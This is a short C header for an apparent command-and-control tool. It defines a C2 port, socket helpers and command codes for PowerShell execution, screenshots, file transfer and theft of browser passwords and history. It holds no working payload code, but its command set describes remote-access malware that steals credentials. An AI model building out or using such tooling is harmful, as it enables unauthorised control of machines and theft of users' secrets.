#ifndef C2_H
#define C2_H

#define C2_PORT         3000
#define C2_BUF_SIZE     16384

// Bunch of constants for cmd code
#define SYS_INFO_CMD 0
#define PSH_CMD 1
#define SCREEN_CMD 2
#define DL_FILE_CMD 3
#define UL_FILE_CMD 4
#define BROWSER_PASS_CMD 5
#define BROWSER_HISTORY_CMD 6
#define BROWSER_DL_CMD 7

// Cross-platform socket abstraction helpers
#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
    typedef SOCKET sock_t;
    #define CLOSE_SOCK(s) closesocket(s)
    #define SHUT_DOWN()   WSACleanup()
    #define SOCK_INIT()   WSADATA w; WSAStartup(MAKEWORD(2,2), &w)
    #include <windows.h>
#else
    #include <unistd.h>
    #include <arpa/inet.h>
    #include <sys/socket.h>
    typedef int sock_t;
    #define CLOSE_SOCK(s) close(s)
    #define SHUT_DOWN()
    #define SOCK_INIT()
    typedef unsigned char BYTE;
#endif

#endif